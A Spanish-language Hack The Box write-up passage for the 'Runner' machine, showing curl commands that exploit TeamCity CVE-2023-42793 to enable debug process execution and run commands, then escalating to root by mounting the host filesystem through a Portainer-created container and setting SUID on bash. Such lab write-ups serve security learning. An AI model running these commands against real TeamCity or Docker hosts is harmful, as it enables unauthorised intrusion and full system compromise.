<p>Para este metodo el post <a href="https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis">CVE-2023-42793</a> nos indica que tenemos que habilitar el modo debug para conseguir RCE</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://teamcity.runner.htb/app/rest/debug/processes?exePath=id"</span> <span class="nt">-H</span> <span class="s1">'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2'</span> 
Responding with error, status code: 400 <span class="o">(</span>Bad Request<span class="o">)</span><span class="nb">.</span>
Details: jetbrains.buildServer.server.rest.errors.BadRequestException: This server is not configured to allow process debug launch via <span class="s2">"rest.debug.processes.enable"</span> internal property
Invalid request. Please check the request URL and data are correct.
</pre></td></tr></tbody></table></code></div></div>

<p>nos tira ese error porque todavia no habilitamos el modo debug, asi que vamos a hacerlo</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-X</span> POST <span class="s1">'http://teamcity.runner.htb/admin/dataDir.html?action=edit&amp;fileName=config%2Finternal.properties&amp;content=rest.debug.processes.enable=true'</span> <span class="nt">-H</span> <span class="s1">'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2'</span>
</pre></td></tr></tbody></table></code></div></div>

<p>bien, ahora la parte final es volver a ejecutar el primer comando que realizamos</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="s2">"http://teamcity.runner.htb/app/rest/debug/processes?exePath=id"</span> <span class="nt">-H</span> <span class="s1">'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2'</span>
StdOut:uid<span class="o">=</span>1000<span class="o">(</span>tcuser<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>tcuser<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>tcuser<span class="o">)</span>

StdErr: 
Exit code: 0
Time: 27ms
</pre></td></tr></tbody></table></code></div></div>

<p>aclaro que este token es el primero que me dio teamcity a la hora de crear mi usuario con privilegios maximos si necesitan volver a generarlo en la explicacion del PoC explico como borrar el token y por logica crear otro. Yo prefiero obtener una shell por SSH porque es mas comodo la TTY.</p>

<p>A la clave privada le tienen que asignar privilegios 600 con chmod y luego pasarle el -i para importar la id_rsa</p>

<h2 id="escalada-de-privilegios"><span class="me-2">Escalada de Privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><a href="/assets/img/htb-writeup-runner/runner8.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner8.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-runner/runner9.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner9.png" alt="" loading="lazy"></a></p>

<p>Enumerando los puertos abiertos dentro de la maquina nos encontramos con el puerto 9000 abierto internamente, posterior a eso con ps queremos ver lo que se esta ejecutando en ese puerto, pero sin exito.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>john@runner:~<span class="nv">$ </span>mount | <span class="nb">grep </span>proc
proc on /proc <span class="nb">type </span>proc <span class="o">(</span>rw,nosuid,nodev,noexec,relatime,hidepid<span class="o">=</span>invisible<span class="o">)</span>
systemd-1 on /proc/sys/fs/binfmt_misc <span class="nb">type </span>autofs <span class="o">(</span>rw,relatime,fd<span class="o">=</span>29,pgrp<span class="o">=</span>1,timeout<span class="o">=</span>0,minproto<span class="o">=</span>5,maxproto<span class="o">=</span>5,direct,pipe_ino<span class="o">=</span>19243<span class="o">)</span>
binfmt_misc on /proc/sys/fs/binfmt_misc <span class="nb">type </span>binfmt_misc <span class="o">(</span>rw,nosuid,nodev,noexec,relatime<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>No podemos ver procesos que corren de otros usuarios en el hipeid -&gt; esta en invisible</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>john@runner:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://localhost:9000 | <span class="nb">head</span> <span class="nt">-n</span> 3
&lt;<span class="o">!</span>doctype html&gt;&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span> ng-app<span class="o">=</span><span class="s2">"portainer"</span> ng-strict-di data-edition<span class="o">=</span><span class="s2">"CE"</span><span class="o">&gt;</span>&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span>/&gt;&lt;title&gt;Portainer&lt;/title&gt;&lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">""</span>/&gt;&lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"author"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Portainer.io"</span>/&gt;&lt;meta http-equiv<span class="o">=</span><span class="s2">"cache-control"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"no-cache"</span>/&gt;&lt;meta http-equiv<span class="o">=</span><span class="s2">"expires"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;meta http-equiv<span class="o">=</span><span class="s2">"pragma"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"no-cache"</span>/&gt;&lt;base <span class="nb">id</span><span class="o">=</span><span class="s2">"base"</span>/&gt;&lt;script&gt;if <span class="o">(</span>window.origin <span class="o">==</span> <span class="s1">'file://'</span><span class="o">)</span> <span class="o">{</span>
        // we are loading the app from a <span class="nb">local </span>file as <span class="k">in </span>docker extension
        document.getElementById<span class="o">(</span><span class="s1">'base'</span><span class="o">)</span>.href <span class="o">=</span> <span class="s1">'http://localhost:49000/'</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Viendo lo que hay en el puerto 9000, notamos que es un <code class="language-plaintext highlighter-rouge">portainer.io</code> y vemos la palabra docker… ahora todo tiene sentido con las 2 intrusiones, si hubiesemos entrado con el RCE del metodo debug hubieramos ganado acceso dentro de un contendor <code class="language-plaintext highlighter-rouge">portainer</code>, teniendo en cuenta todo esto vamos a realizar un Local Port Fordwarding con SSH</p>

<p><a href="/assets/img/htb-writeup-runner/runner10.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner10.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-runner/runner11.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner11.png" alt="" loading="lazy"></a></p>

<p>Es importante anotar todo lo que conseguimos a la hora de enumerar la maquina, recordemos que tenemos credenciales de matthew y no nos sirivieron para nada. En esta ocasion puede ser que funcione</p>

<p><a href="/assets/img/htb-writeup-runner/runner12.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner12.png" alt="" loading="lazy"></a></p>

<p>Que es Portainer?
Portainer es una herramienta web open-source la cual se ejecuta ella misma como un container, por tanto deberemos tener Docker instalado. Esta aplicación nos va a permitir gestionar de forma muy fácil e intuitiva nuestros contenedores Docker a través de una interfaz gráfica.</p>

<p>Listo estamos dentro de portainer lo primero que haria como atacante es buscar en que version estamos y ir viendo como podemos aprovecharnos de los contenedores, podemos ver malas configuraciones de docker o vulnerabilidades asociadas a CVEs.</p>

<p>Si clickeo en <code class="language-plaintext highlighter-rouge">primary</code> tenemos mas opciones y configuraciones las mas importantes son <code class="language-plaintext highlighter-rouge">images</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Tenemos 2 imagenes: ubuntu:latest, teamcity:latest
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-runner/runner13.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner13.png" alt="" loading="lazy"></a></p>

<p>Tambien tenemos 2 volumenes, un volumen en docker es un área de almacenamiento de datos que puede montarse en un contenedor para proporcionar almacenamiento persistente, si leemos la documentacion de portainer nos muestra como crear un volumen. Yo creo que esta seria nuestra via para escalar privilegios.</p>

<p><a href="/assets/img/htb-writeup-runner/runner14.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner14.png" alt="" loading="lazy"></a></p>

<p>Le damos a add volume y agregamos estas configuraciones para crear el volumen</p>

<p><a href="/assets/img/htb-writeup-runner/runner15.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner15.png" alt="" loading="lazy"></a></p>

<p>Con esto ya tendriamos creado el nuevo volumen.</p>

<p><a href="/assets/img/htb-writeup-runner/runner16.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner16.png" alt="" loading="lazy"></a></p>

<p>Ahora nos dirigimos a containers y clickeamos a add container para crear un nuevo contenedor</p>

<p><a href="/assets/img/htb-writeup-runner/runner17.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner17.png" alt="" loading="lazy"></a></p>

<p>Nombre test y en la imagen ponemos la imagen teamcity:latest… y abajo en configuracion avanzada vamos a agregar estos parametros.. <code class="language-plaintext highlighter-rouge">Interactive &amp; TTY</code> y en volumes <code class="language-plaintext highlighter-rouge">/mnt/root</code> para traernos la maquina real como una montura</p>

<p><a href="/assets/img/htb-writeup-runner/runner18.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner18.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-runner/runner19.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner19.png" alt="" loading="lazy"></a></p>

<p>Clickeamos en deploy the container…. una vez que se cree vamos a clickear en el contenedor y darle en console para conseguir una shell grafica en la web</p>

<p><a href="/assets/img/htb-writeup-runner/runner20.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner20.png" alt="" loading="lazy"></a></p>

<p>En <code class="language-plaintext highlighter-rouge">user</code> vamos a poner root y a darle a connect y listo…. en la carpeta <code class="language-plaintext highlighter-rouge">mnt/root</code> vamos a tener la maquina real y darle permisos SUID a la bash para escalar privilegios</p>

<p><a href="/assets/img/htb-writeup-runner/runner21.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-runner/runner21.png" alt="" loading="lazy"></a></p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/htb/">htb</a>,
          <a href="/categories/linux/">linux</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/linux/"
            class="post-tag no-text-decoration"
          >Linux</a>
        
          <a
            href="/tags/web/"
            class="post-tag no-text-decoration"
          >Web</a>
        
          <a
            href="/tags/api/"
            class="post-tag no-text-decoration"
          >API</a>
        
          <a
            href="/tags/code/"
            class="post-tag no-text-decoration"
          >Code</a>
        
          <a
            href="/tags/execution/"
            class="post-tag no-text-decoration"
          >Execution</a>
        
          <a
            href="/tags/suid/"
            class="post-tag no-text-decoration"
          >Suid</a>
        
          <a
            href="/tags/cve/"
            class="post-tag no-text-decoration"
          >CVE</a>
        
          <a
            href="/tags/docker/"
            class="post-tag no-text-decoration"
          >Docker</a>
        
          <a
            href="/tags/portainer/"
            class="post-tag no-text-decoration"
          >Portainer</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/imagery/">Imagery - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/editorial/">Editorial - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/runner/">Runner - Hack The Box</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/stocker/">Stocker - Hack The Box</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api/">API</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/app/">App</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/code/">Code</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/curl/">Curl</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/docker/">Docker</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/execution/">Execution</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fuzz/">Fuzz</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/editorial/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1761004800"
  data-df="ll"
  
>
  Oct 21, 2025
</time>

              <h4 class="pt-0 my-2">Editorial - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  

Editorial es una máquina Linux de dificultad fácil que cuenta con una aplicación web de publicación vulnerable a Falsificación de Solicitud del Lado del Servidor (SSRF). Esta vulnerabilidad se ap...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/stocker/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760400000"
  data-df="ll"
  
>
  Oct 14, 2025
</time>

              <h4 class="pt-0 my-2">Stocker - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  
Stocker es una máquina Linux de dificultad media que cuenta con un sitio web que se ejecuta en el puerto 80 y que anuncia diversos muebles para el hogar. A través de la enumeración vHost, se ident...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/imagery/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1761264000"
  data-df="ll"
  
>
  Oct 24, 2025
</time>

              <h4 class="pt-0 my-2">Imagery - Hack The Box</h4>
              <div class="text-muted">
                <p>
                  





                  

Imagery es una maquina de dificultad Media que al principio del escaneo nos encontramos con una web desarrollada en el lenguaje python werkzeug. Al principio parece una web normal y simple de sub...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/stocker/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Stocker - Hack The Box</p>
    </a>
  

  
    <a
      href="/posts/editorial/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Editorial - Hack The Box</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://github.com/MrIncreibl3">MrIncreibl3</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api/">API</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/app/">App</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/code/">Code</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/curl/">Curl</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/docker/">Docker</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/execution/">Execution</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fuzz/">Fuzz</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

